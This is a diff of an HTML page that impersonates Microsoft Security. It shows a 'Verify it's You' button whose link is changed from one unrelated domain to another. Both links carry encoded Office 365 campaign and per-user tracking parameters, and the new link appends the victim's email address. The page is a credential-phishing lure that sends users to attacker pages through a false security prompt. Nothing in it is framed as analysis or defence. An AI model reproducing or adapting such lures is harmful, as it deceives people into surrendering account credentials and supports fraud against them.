@@ -128,7 +128,8 @@
                 <div class="form-group">Your account is currently set to protect you.</div>
                 <div class="form-group">Microsoft Security needs to verify it's you.</div>
                 <!-- Button that triggers a link -->
-                <a href="https://www.essence-gas.com/m/?c3Y9bzM2NV8xX25vbSZyYW5kPVpuaGpVMGM9JnVpZD1VU0VSMTQxMDIwMjRVMTQxMDE0NDU=N0123N" target="_blank">
+                <a href=" https://adhanuartha.com/m/?c3Y9bzM2NV8xX3ZvaWNlJnJhbmQ9V0hWNGIzWT0mdWlkPVVTRVIxNDEwMjAyNFUxNDEwMTQ0NQ==N0123N[EMAIL]
+">
                     <button>Verify it’s You</button>
                 </a>
             </div>
